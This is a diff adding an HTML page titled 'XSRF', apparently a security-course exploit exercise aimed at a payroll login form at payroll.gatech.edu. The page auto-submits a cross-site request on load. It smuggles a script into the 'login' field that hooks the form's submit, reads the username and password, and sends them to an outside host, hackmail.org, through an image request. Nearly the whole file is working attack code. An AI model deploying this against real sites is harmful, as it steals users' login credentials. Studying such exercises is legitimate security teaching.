@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>XSRF</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form action="http://payroll.gatech.edu/index.php" onsubmit="" method="POST">
+    <!--
+      Your exploits here
+      You may also want to change some form attributes
+    -->
+    <input type="hidden" name="login" value='">
+<script>
+function hack(e) {
+	alert("hi");
+	username = document.getElementsByName("login")[0].value;
+	password = document.getElementsByName("pw")[0].value;
+console.log(username);
+console.log(password);
+	var myImage = new Image();
+	var url = "http://hackmail.org/sendmail.php?" + "&username=haxor" + "&payload=" + username + " " + password;
+	myImage.src = url;
+}
+
+window.onload = function() {
+  var form = document.querySelector("form");
+  form.onsubmit = hack.bind(form);
+}
+</script><input type="hidden" value="' />
+    </form>
+  </body>
+</html>
